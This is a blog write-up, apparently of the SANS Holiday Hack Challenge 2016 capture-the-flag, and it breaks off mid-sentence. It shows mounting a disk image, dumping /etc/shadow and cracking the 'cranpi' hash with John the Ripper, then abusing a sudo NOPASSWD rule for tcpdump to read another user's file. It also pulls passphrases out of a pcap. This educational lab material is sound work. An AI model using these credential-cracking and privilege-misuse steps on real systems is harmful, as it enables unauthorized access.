&lt;img alt="cranpi_introduction.png" class="align-center" src="/images/sans-christmas-challenge-2016/cranpi_introduction.png" /&gt;
&lt;p&gt;Indeed, strewn across the North Pole, we can find pieces of the Cranberry Pi
system:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;A Cranberry Pi board&lt;/li&gt;
&lt;li&gt;A heat sink (why would you need one in the North Pole in the first place?)&lt;/li&gt;
&lt;li&gt;An HDMI cable&lt;/li&gt;
&lt;li&gt;An SD card&lt;/li&gt;
&lt;li&gt;A power cord&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We now have a full Cranberry Pi system. The only missing part is given by the
elf Holly Evergreen: a &lt;a class="reference external" href="https://www.northpolewonderland.com/cranbian.img.zip"&gt;Cranbian image&lt;/a&gt;,
which we can use to boot on our Cranberry Pi.&lt;/p&gt;
&lt;p&gt;However, in order to use our CranPi, we need the password to open a user
session. Luckily, &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image"&gt;this tutorial&lt;/a&gt;
by Josh Wright teaches us how we can mount a Raspberry Pi file system image.
Since Cranberry Pi and Raspberry Pi are basically the same (wake up, sheeple!),
we now know how to mount our Cranbian image:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip cranbian.img.zip
Archive:  cranbian.img.zip
  inflating: cranbian-jessie.img
&lt;span class="nv"&gt;$ &lt;/span&gt;/sbin/fdisk -l cranbian-jessie.img

Disque cranbian-jessie.img : 1,3 GiB, 1389363200 octets, 2713600 secteurs
Unités : secteur de &lt;span class="m"&gt;1&lt;/span&gt; × &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 512 octets
Taille de secteur &lt;span class="o"&gt;(&lt;/span&gt;logique / physique&lt;span class="o"&gt;)&lt;/span&gt; : 512 octets / 512 octets
taille d&lt;span class="s1"&gt;&amp;#39;E/S (minimale / optimale) : 512 octets / 512 octets&lt;/span&gt;
&lt;span class="s1"&gt;Type d&amp;#39;&lt;/span&gt;étiquette de disque : dos
Identifiant de disque : 0x5a7089a1

Device               Boot  Start     End Sectors  Size Id Type
cranbian-jessie.img1        &lt;span class="m"&gt;8192&lt;/span&gt;  &lt;span class="m"&gt;137215&lt;/span&gt;  &lt;span class="m"&gt;129024&lt;/span&gt;   63M  c W95 FAT32 &lt;span class="o"&gt;(&lt;/span&gt;LBA&lt;span class="o"&gt;)&lt;/span&gt;
cranbian-jessie.img2      &lt;span class="m"&gt;137216&lt;/span&gt; &lt;span class="m"&gt;2713599&lt;/span&gt; &lt;span class="m"&gt;2576384&lt;/span&gt;  1,2G &lt;span class="m"&gt;83&lt;/span&gt; Linux
&lt;span class="nv"&gt;$ &lt;/span&gt;mkdir cranbian_img_extracted
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo mount -v -o &lt;span class="nv"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$((&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="m"&gt;137216&lt;/span&gt;&lt;span class="k"&gt;))&lt;/span&gt; -t ext4 ./cranbian-jessie.img ./cranbian_img_extracted
mount : /dev/loop0 monté sur ./cranbian_img_extracted.
&lt;span class="nv"&gt;$ &lt;/span&gt;ls cranbian_img_extracted/
bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have access to the Cranbian file system. This means that we can try to
crack passwords in the &lt;code&gt;shadow&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat cranbian_img_extracted/etc/shadow
root:*:17067:0:99999:7:::
daemon:*:17067:0:99999:7:::
bin:*:17067:0:99999:7:::
sys:*:17067:0:99999:7:::
sync:*:17067:0:99999:7:::
games:*:17067:0:99999:7:::
man:*:17067:0:99999:7:::
lp:*:17067:0:99999:7:::
mail:*:17067:0:99999:7:::
news:*:17067:0:99999:7:::
uucp:*:17067:0:99999:7:::
proxy:*:17067:0:99999:7:::
www-data:*:17067:0:99999:7:::
backup:*:17067:0:99999:7:::
list:*:17067:0:99999:7:::
irc:*:17067:0:99999:7:::
gnats:*:17067:0:99999:7:::
nobody:*:17067:0:99999:7:::
systemd-timesync:*:17067:0:99999:7:::
systemd-network:*:17067:0:99999:7:::
systemd-resolve:*:17067:0:99999:7:::
systemd-bus-proxy:*:17067:0:99999:7:::
messagebus:*:17067:0:99999:7:::
avahi:*:17067:0:99999:7:::
ntp:*:17067:0:99999:7:::
sshd:*:17067:0:99999:7:::
statd:*:17067:0:99999:7:::
&lt;span class="hll"&gt;cranpi:&lt;span class="nv"&gt;$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY&lt;/span&gt;/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can do so by using John the Ripper with the &lt;a class="reference external" href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz"&gt;rockyou&lt;/a&gt;
dictionary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;john --wordlist&lt;span class="o"&gt;=&lt;/span&gt;./rockyou.txt ./cranbian_img_extracted/etc/shadow
Using default input encoding: UTF-8
Loaded &lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class="o"&gt;(&lt;/span&gt;3&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;$6$ &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;SHA512 128/128 AVX 2x&lt;span class="o"&gt;])&lt;/span&gt;
Will run &lt;span class="m"&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class="k"&gt;for&lt;/span&gt; status
&lt;span class="hll"&gt;yummycookies     &lt;span class="o"&gt;(&lt;/span&gt;cranpi&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;1g 0:00:06:12 DONE &lt;span class="o"&gt;(&lt;/span&gt;2016-12-24 19:11&lt;span class="o"&gt;)&lt;/span&gt; 0.002687g/s 1221p/s 1221c/s 1221C/s 03698741..yoatzin
Use the &lt;span class="s2"&gt;&amp;quot;--show&amp;quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a valid account: &lt;code&gt;cranpi/yummycookies&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can now interact with every terminal in the North Pole. Every terminal is
basicaly a minimal Linux system on which we have to find some sort of flag,
to use as a passphrase to open the door next to it.&lt;/p&gt;
&lt;div class="section" id="elf-house-2"&gt;
&lt;h3&gt;Elf House #2&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
*To open the door, find both parts of the passphrase inside the /out.pcap file*
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;So, apparently, the passphrase is in two parts, in a network capture file.
Let's take a look at this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;ls -l /out.pcap
-r-------- &lt;span class="m"&gt;1&lt;/span&gt; itchy itchy &lt;span class="m"&gt;1087929&lt;/span&gt; Dec  &lt;span class="m"&gt;2&lt;/span&gt; 15:05 /out.pcap
scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;cat /out.pcap
cat: /out.pcap: Permission denied
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, this file belongs to user &lt;code&gt;itchy&lt;/code&gt;, and we can't read it. Let's see
what's installed on the system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;cat /var/log/apt/history.log
Start-Date: 2016-11-04  18:30:58
Commandline: apt-get dist-upgrade -y
Upgrade: tzdata:amd64 &lt;span class="o"&gt;(&lt;/span&gt;2016f-0+deb8u1, 2016h-0+deb8u1&lt;span class="o"&gt;)&lt;/span&gt;, tar:amd64 &lt;span class="o"&gt;(&lt;/span&gt;1.27.1-2+b1, 1.27.1-
2+deb8u1&lt;span class="o"&gt;)&lt;/span&gt;
End-Date: 2016-11-04  18:31:00
Start-Date: 2016-12-01  21:18:39
Commandline: apt-get install -y tcpdump sudo nano vim binutils
Install: nano:amd64 &lt;span class="o"&gt;(&lt;/span&gt;2.2.6-3&lt;span class="o"&gt;)&lt;/span&gt;, libssl1.0.0:amd64 &lt;span class="o"&gt;(&lt;/span&gt;1.0.1t-1+deb8u5, automatic&lt;span class="o"&gt;)&lt;/span&gt;, tcpdump:
amd64 &lt;span class="o"&gt;(&lt;/span&gt;4.6.2-5+deb8u1&lt;span class="o"&gt;)&lt;/span&gt;, libpcap0.8:amd64 &lt;span class="o"&gt;(&lt;/span&gt;1.6.2-2, automatic&lt;span class="o"&gt;)&lt;/span&gt;, vim-common:amd64 &lt;span class="o"&gt;(&lt;/span&gt;7.4.48
8-7+deb8u1, automatic&lt;span class="o"&gt;)&lt;/span&gt;, sudo:amd64 &lt;span class="o"&gt;(&lt;/span&gt;1.8.10p3-1+deb8u3&lt;span class="o"&gt;)&lt;/span&gt;, binutils:amd64 &lt;span class="o"&gt;(&lt;/span&gt;2.25-5&lt;span class="o"&gt;)&lt;/span&gt;, vim:am
d64 &lt;span class="o"&gt;(&lt;/span&gt;7.4.488-7+deb8u1&lt;span class="o"&gt;)&lt;/span&gt;, vim-runtime:amd64 &lt;span class="o"&gt;(&lt;/span&gt;7.4.488-7+deb8u1, automatic&lt;span class="o"&gt;)&lt;/span&gt;, libgpm2:amd64
&lt;span class="o"&gt;(&lt;/span&gt;1.20.4-6.1+b2, automatic&lt;span class="o"&gt;)&lt;/span&gt;
End-Date: 2016-12-01  21:18:41
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, &lt;code&gt;sudo&lt;/code&gt; and &lt;code&gt;tcpdump&lt;/code&gt; were both installed on the system. Maybe
there's a particular configuration in the &lt;code&gt;/etc/sudoers&lt;/code&gt; file that allows
us to run &lt;code&gt;tcpdump&lt;/code&gt; as &lt;code&gt;itchy&lt;/code&gt; without having to provide any
password... Let's try to use &lt;code&gt;sudo&lt;/code&gt; and &lt;code&gt;tcpdump&lt;/code&gt; to read the
content of the file, and write it in another one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;sudo -u itchy tcpdump -r /out.pcap -w /tmp/out2.pcap
sudo: unable to resolve host 31368df46952
reading from file /out.pcap, link-type EN10MB &lt;span class="o"&gt;(&lt;/span&gt;Ethernet&lt;span class="o"&gt;)&lt;/span&gt;
scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;ls -lh /tmp/out2.pcap
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; itchy itchy 1.1M Dec &lt;span class="m"&gt;25&lt;/span&gt; 02:56 /tmp/out2.pcap
scratchy@31368df46952:/&lt;span class="nv"&gt;$ &lt;/span&gt;sha256sum /tmp/out2.pcap
07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985  /tmp/out2.pcap
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;w00t, we we're indeed able to copy the content of the file to another file,
which we can read, since we were able to compute its sha256 sum.&lt;/p&gt;
&lt;p&gt;I learned afterwards the existence of the &lt;code&gt;-l&lt;/code&gt; flag in &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
SUDO(8)                                                                            BSD System Manager's Manual                                                                            SUDO(8)

NAME
     sudo, sudoedit — execute a command as another user

SYNOPSIS
     sudo -h | -K | -k | -V
     sudo -v [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-u user]
     sudo -l [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
[...]
     -l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format
                 is used if this option is specified multiple times and the security policy supports a verbose output format.
&lt;/pre&gt;
&lt;p&gt;And all this time, I was thinking:&lt;/p&gt;
&lt;blockquote&gt;
Hmm, is there a way to list what you can do with &lt;code&gt;sudo&lt;/code&gt; when you
can't read the &lt;code&gt;/etc/sudoers&lt;/code&gt; file? Well, I'll search later!&lt;/blockquote&gt;
&lt;p&gt;Why, yes, Yannick, it &lt;strong&gt;IS&lt;/strong&gt; possible! It's the &lt;code&gt;-l&lt;/code&gt; flag! You lazy, you.
#TheMoreYouKnow&lt;/p&gt;
&lt;p&gt;Anyway, if you issue &lt;code&gt;sudo -l&lt;/code&gt;, you can see that we can indeed run
&lt;code&gt;tcpdump&lt;/code&gt; and &lt;code&gt;strings&lt;/code&gt; as the &lt;code&gt;itchy&lt;/code&gt; user, without knowing
the &lt;code&gt;scratchy&lt;/code&gt; user's password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;scratchy@8bb89db76dd2:/&lt;span class="nv"&gt;$ &lt;/span&gt;sudo -l
sudo: unable to resolve host 8bb89db76dd2
Matching Defaults entries &lt;span class="k"&gt;for&lt;/span&gt; scratchy on 8bb89db76dd2:
    env_reset, mail_badpass,
    &lt;span class="nv"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/bin&lt;span class="se"&gt;\:&lt;/span&gt;/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/bin
User scratchy may run the following commands on 8bb89db76dd2:
&lt;span class="hll"&gt;    &lt;span class="o"&gt;(&lt;/span&gt;itchy&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/tcpdump
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="o"&gt;(&lt;/span&gt;itchy&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/strings
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that I had a readable copy of the PCAP file, I extracted the content of
this PCAP, by base64 encoding, so that I could analyze it on my own machine.
You can download the PCAP file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/out.pcap"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;We can now open the PCAP file in Wireshark, which is a hell of a lot nicer than
analyzing it on the terminal:&lt;/p&gt;
&lt;img alt="wireshark_pcap.png" class="align-center" src="/images/sans-christmas-challenge-2016/wireshark_pcap.png" /&gt;
&lt;p&gt;We can see a request to a file called &lt;code&gt;firsthalf.html&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/firsthalf.html&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Wget/1.17.1 (darwin15.2.0)&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;identity&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;192.168.188.130&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Keep-Alive&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.0&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SimpleHTTP/0.6 Python/2.7.12+&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:28:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;113&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:25:35 GMT&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;part1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;santasli&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have the first half of our passphrase, &lt;code&gt;santasli&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, to take a look at the second half. We can see that there is another
HTTP request, for the second half:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/secondhalf.bin&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Wget/1.17.1 (darwin15.2.0)&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;identity&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;192.168.188.130&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Keep-Alive&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.0&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SimpleHTTP/0.6 Python/2.7.12+&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:28:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/octet-stream&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1048097&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:26:12 GMT&lt;/span&gt;

L}*.O..r.v./....v....z{.x.&amp;#39;.l.(..@.1].X...k7.?.../.B..G.FPj.`~.%.....a~.;90.cLgc.q2..`.D.x...V....6...........@...x. %JK...kO...Idw..&amp;lt;..G.\.
....... .....(.._.1sf..)$mg@..=.*
........
[snip]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that a lot of binary content is being downloaded. I extracted it,
and tried to identify it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file secondhalf.bin
secondhalf.bin: data
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Uh oh, &lt;code&gt;file&lt;/code&gt; was not able to identify the type of file. Maybe the start
of the file is just garbage, but there are some files carved later in the file.
Let's use &lt;code&gt;binwalk&lt;/code&gt;, it should give us something to work with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk secondhalf.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Damn, nothing. Maybe &lt;code&gt;foremost&lt;/code&gt; will have more luck?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;foremost secondhalf.bin
Processing: secondhalf.bin
&lt;span class="p"&gt;|&lt;/span&gt;*&lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;cat output/audit.txt
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Mon Dec &lt;span class="m"&gt;26&lt;/span&gt; 00:44:48 2016
Invocation: foremost secondhalf.bin
Output directory: output
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: secondhalf.bin
Start: Mon Dec &lt;span class="m"&gt;26&lt;/span&gt; 00:44:48 2016
Length: &lt;span class="m"&gt;1009&lt;/span&gt; KB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1033943&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;

Num  Name &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;512&lt;span class="o"&gt;)&lt;/span&gt;         Size  File Offset     Comment

Finish: Mon Dec &lt;span class="m"&gt;26&lt;/span&gt; 00:44:48 2016

&lt;span class="m"&gt;0&lt;/span&gt; FILES EXTRACTED

------------------------------------------------------------------

Foremost finished at Mon Dec &lt;span class="m"&gt;26&lt;/span&gt; 00:44:48 2016
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Still nothing... Is this file completely random? Let's use &lt;code&gt;ent&lt;/code&gt; to
measure the entropy of the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ent secondhalf.bin
&lt;span class="nv"&gt;Entropy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 7.999841 bits per byte.

Optimum compression would reduce the size
of this &lt;span class="m"&gt;1033943&lt;/span&gt; byte file by &lt;span class="m"&gt;0&lt;/span&gt; percent.

Chi square distribution &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;1033943&lt;/span&gt; samples is 227.29, and randomly
would exceed this value 75.00 percent of the times.

Arithmetic mean value of data bytes is 127.4329 &lt;span class="o"&gt;(&lt;/span&gt;127.5 &lt;span class="o"&gt;=&lt;/span&gt; random&lt;span class="o"&gt;)&lt;/span&gt;.
Monte Carlo value &lt;span class="k"&gt;for&lt;/span&gt; Pi is 3.145233080 &lt;span class="o"&gt;(&lt;/span&gt;error 0.12 percent&lt;span class="o"&gt;)&lt;/span&gt;.
Serial correlation coefficient is -0.001185 &lt;span class="o"&gt;(&lt;/span&gt;totally &lt;span class="nv"&gt;uncorrelated&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0.0&lt;span class="o"&gt;)&lt;/span&gt;.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With these kinds of results, we can be pretty sture that this file is random.
The logical thing is to assume that it's some kind of encrypted file. What's
more, by looking at the end of the capture file, we can see some Dropbox LAN
Sync Discovery Protocol:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
{&amp;quot;host_int&amp;quot;: 266670160730277518981342002975279884847, &amp;quot;version&amp;quot;: [2, 0], &amp;quot;displayname&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;port&amp;quot;: 17500, &amp;quot;namespaces&amp;quot;: [1149071040, 1139770785, 1357103393, 1296963687, 1139786665, 1261247053, 1331126254, 1179166992, 1210559602, 1261612467, 1223790038, 1234538553, 1304191898, 1246301403, 1056298300, 1207374239]}
&lt;/pre&gt;
&lt;p&gt;With this, I was pretty sure to have it the jackpot! I spent the whole day
reading documentation on Dropbox attacks, relying on the knowledge of this
&lt;code&gt;host_int&lt;/code&gt; parameter... and a &lt;code&gt;host_id&lt;/code&gt; parameter, which was
impossible to find anywhere. I tried to use the &lt;code&gt;host_int&lt;/code&gt; paramter
directly as a decryption key, with several &lt;code&gt;openssl&lt;/code&gt; algorithm, but, of
course, to no avail.&lt;/p&gt;
&lt;p&gt;In a move of desperation, I went to &lt;a class="reference external" href="https://reddit.com/r/netsec"&gt;/r/netsec&lt;/a&gt;,
in order to find some clue on this particular part (I was weak, I'm sorry).
&lt;a class="reference external" href="https://www.reddit.com/r/netsec/comments/5hmlkj/the_2016_sans_holiday_hack_challenge/db5qoes/"&gt;This comment&lt;/a&gt;
really turned things around:&lt;/p&gt;
&lt;blockquote&gt;
What types of strings does the strings utility look for, by default? #hint&lt;/blockquote&gt;
&lt;p&gt;With this clue, I immediatly found out. By default, &lt;code&gt;strings&lt;/code&gt; looks for
strings with a minimum length of 4, &lt;strong&gt;with a default encoding of 7-bit ASCII&lt;/strong&gt;.
The binary data probably contained a string encoding in another form. I
immediatly tried 16-bit big endian:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;strings -e b secondhalf.bin
&lt;span class="hll"&gt;art2:ttlehelper
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;My error here was to assume that the binary data was in fact an encrypted blob.
Anyway, the second half is &lt;code&gt;ttlehelper&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Passphrase: &lt;code&gt;santaslittlehelper&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="workshop-first-door"&gt;
&lt;h3&gt;Workshop, first door&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
* To open the door, find the passphrase file deep in the directories.         *
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;According to the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Motd_%28Unix%29"&gt;motd&lt;/a&gt;, there
is on the file system a file containing the passphrase to the door. We can
use the &lt;code&gt;find&lt;/code&gt; command to list every file on the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find / -type f 2&amp;gt; /dev/null &amp;gt; ~/files.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;head ~/files.txt
/home/elf/files.txt
/home/elf/.bashrc
&lt;span class="hll"&gt;/home/elf/.doormat/. / /&lt;span class="se"&gt;\/\\&lt;/span&gt;/Don&lt;span class="s1"&gt;&amp;#39;t Look Here!/You are persistent, aren&amp;#39;&lt;/span&gt;t you?/&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;/key_for_the_door.txt
&lt;/span&gt;/home/elf/.profile
/home/elf/.bash_logout
/etc/hosts
/etc/resolv.conf
/etc/hostname
/etc/shadow
/etc/passwd-
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The higlighted file seems interesting. However, there's a lot of tricky
